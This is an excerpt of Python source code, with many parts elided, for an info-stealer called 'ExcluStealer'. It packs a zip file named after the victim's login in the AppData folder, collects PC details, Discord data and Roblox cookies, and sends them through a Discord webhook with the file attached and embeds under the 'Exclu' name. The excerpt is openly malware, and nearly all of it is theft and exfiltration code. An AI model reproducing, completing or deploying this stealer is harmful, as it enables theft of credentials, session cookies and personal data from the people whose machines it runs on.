...
def main(webhook: str):
    ...
    _file = None
    _file = File(f'{localappdata}\\Exclu-Logged-{os.getlogin()}.zip')
    ...
    webhook.send(content=content, file=_file, avatar_url="https://cdn.discordapp.com/attachments/1031914021349236777/1058055029854056640/standard.gif", username="ExcluStealer")

    PcInfo()
    Discord()


def Exclu(webhook: str):
    Debug()
...
class PcInfo:
    ...
    def get_inf(self, webhook):
        webhook = SyncWebhook.from_url(webhook, session=requests.Session())
        embed = Embed(title="Exclu Logger", color=5639644)
        ...
        embed.add_field(
            ...
            inline=False)
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1031914021349236777/1058055029854056640/standard.gif")

        webhook.send(embed=embed, avatar_url="https://cdn.discordapp.com/attachments/1031914021349236777/1058055029854056640/standard.gif", username="Exclu")
    ...
    def robloxinfo(self, webhook):
        try:
            if robo_cookie == "No Roblox Cookies Found":
                ...
                webhook.send(
                    avatar_url="https://cdn.discordapp.com/attachments/1031914021349236777/1058055029854056640/standard.gif",
                    embed=embed,
                    username="Exclu")
        except Exception:
            pass
...
def zipup():
    ...
    _zipfile = os.path.join(localappdata, f'Exclu-Logged-{os.getlogin()}.zip')
